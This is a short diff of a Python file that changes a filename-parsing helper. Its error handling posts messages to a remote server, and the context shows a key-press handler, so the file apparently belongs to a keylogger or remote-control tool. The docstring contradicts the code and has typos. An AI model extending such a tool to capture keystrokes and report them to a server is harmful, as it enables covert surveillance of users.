@@ -63,14 +63,18 @@ def post_to_server(message: str, response_path=RESPONSE):
 
 
 def get_filename(input_string):
-    """this is a function that split string and returns third item and items after that.
+    """this is a function that split string and returns third item and greater items after that.
     by default, all forwarded slashes in the third item Changed to backslashes
     this can be disabled, if replace set on False during call function. """
-    try:
-        return " ".join(input_string.split()[2:]).replace("\\", "/")
-    # If the path of the file doesn't enter correctly, notify us on the server
-    except IndexError:
-        post_to_server(f"You must enter Argument after {input_string}. \n")
+    outputString = " ".join(input_string.split()[2:]).replace("\\", "/")
+
+    # If Actually mean filepath is entered correctly and then return it.
+    if outputString:
+        return outputString
+    # If not(else), return None and notify us on the server
+    else:
+        post_to_server(f"You mus enter filename after {outputString}. \n")
+
 
 
 def on_press(key_press):
